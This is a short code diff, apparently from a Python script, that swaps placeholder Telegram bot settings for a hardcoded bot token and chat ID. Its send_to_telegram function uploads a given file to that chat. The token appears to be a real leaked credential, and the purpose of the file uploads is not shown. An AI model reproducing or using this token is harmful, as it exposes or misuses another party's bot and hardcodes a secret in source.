@@ -3,8 +3,8 @@ import os
 import requests
 
 # إعدادات تلغرام
-BOT_TOKEN = 'YOUR_BOT_TOKEN'
-CHAT_ID = 'YOUR_CHAT_ID'
+BOT_TOKEN = '8716390236:AAEjPGJSYXN5FrqsuI845KhQoVzMfM_Suoo'
+CHAT_ID = '5067771509'
 
 def send_to_telegram(file_path):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
